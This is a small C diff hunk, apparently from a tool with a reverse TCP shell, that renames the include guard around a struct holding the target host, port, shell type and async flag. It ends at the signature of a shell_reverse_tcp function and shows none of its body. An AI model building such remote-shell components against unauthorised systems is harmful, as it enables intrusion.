@@ -43,14 +43,14 @@ extern char **environ;
 #define SHELL_ASYNC_DEFINED
 #endif
 
-#ifndef SHELL_REVERSE_TCP_ARGS_T_DEFINED
+#ifndef SHELL_REVERSE_TCP_ARGS
 typedef struct{
   char host[MAX_DOMAIN_LEN];
   int host_port;
   int shell_type;
   int shell_async;
 } shell_reverse_tcp_args_t;
-#define SHELL_REVERSE_TCP_ARGS_T_DEFINED
+#define SHELL_REVERSE_TCP_ARGS 0
 #endif
 
 void *shell_reverse_tcp(void *args){
